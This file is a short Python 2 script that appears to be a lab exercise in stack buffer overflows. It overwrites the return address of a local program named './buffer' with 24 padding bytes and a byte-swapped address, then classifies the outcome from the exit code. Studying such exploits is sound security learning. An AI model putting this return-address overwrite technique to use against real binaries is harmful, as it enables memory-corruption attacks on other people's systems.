#!/usr/bin/python
import os
import time
from struct import *
import sys
import array
import subprocess

#varhex = "0x7ffffffe6700"
varhex = "0x40058b" 
nops = 'A'*24

def validate_address(varhex):
	shellcode = []
	rip = ''
	hstep = 2
	if varhex[::-1][len(varhex[::-1]) - 2:] == 'x0':
		print "Address is valid"
		address_arr = array.array('H',varhex[::-1])
		address_arr.byteswap()
		reversed_address = address_arr.tostring()
		for i in range(0, len(reversed_address), 2): 
			slicex = reversed_address[i:hstep]
			hstep += 2
			new = r'\x' + slicex
			shellcode.append(new)
		print shellcode
		rip = rip.join(shellcode)
		print "Original Address %s" % (varhex)
		print "Reversed ByteSwapped Address %s" % (reversed_address)
		print "ShellCode RIP Address %s" % (rip[:-4])
		return rip[:-4]
	else: 
		print "Invalid Hex Address given"
	
def load_process(varhex):
	return_address = validate_address(varhex)
	print str(return_address)
	#return_address = "\x8c\x05\x40"
	#arg = subprocess.Popen(["./buffer" , nops + "\x8c\x05\x40"],stdout=subprocess.PIPE)
	arg = subprocess.Popen(["./buffer" , nops + str(return_address)],stdout=subprocess.PIPE)
	#arg = subprocess.Popen(["./buffer" , nops + varhex],stdout=subprocess.PIPE)
	arg.communicate()
	if arg.returncode == -11:
		print "Segmentation Fault (code dumped)"
	elif arg.returncode == -4:
		print "Illegal Instructions"
	elif arg.returncode == 0:
		print "------------------------------------"
		print "Program Exitted Correctly"
		print "ShellCode Triggerred"
		print "************************************"
	else:
		print "No idea", arg.returncode
	arg.wait()

def pop_return_address(varhex):
	for i in range(0, 1):
	#for i in range(0, 100000):
		i = int(varhex, 16)
		i += 1
		varhex = hex(i)
		print "Starting Validation for %s --------" % (varhex)
		load_process(varhex)
		print "Ending Process ******* "
		#time.sleep(2)


#def calculate_offset():
#validate_address(varhex)
#load_process(varhex)
pop_return_address(varhex)

